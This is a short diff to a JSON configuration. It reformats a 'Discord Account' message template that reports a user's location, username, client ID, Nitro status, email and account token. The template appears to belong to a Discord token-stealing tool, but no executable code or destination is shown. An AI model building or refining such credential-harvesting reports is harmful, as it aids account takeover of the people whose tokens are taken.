@@ -13,7 +13,7 @@
         "ErrorColor": "#e94949",
         "SuccessColor": "#49e959",
         "MessageTitle": "Discord Account | {1}",
-        "MessageBody": "AT: {1}\\nUser: {2}\\nID: {3}\\nE-Mail: {4}{spoiler}\\nToken: {5}",
+        "MessageBody": "__**:clipboard: Account Details:**__\\n\\n**:blue_book: AT:** _{location}_\\n\\n**:bust_in_silhouette: User:** {username}\\n\\n**:id: Client ID:** {userID}\\n\\n**:moneybag: Has Nitro:** {HasNitro}\\n\\n**:mailbox_with_mail: Email:** {email}{spoiler}\\n\\n**:key: Client Token:**\\n||{token}||",
         "ErrorImageURL": "",
         "SuccessImageURL": "{1}"
     }
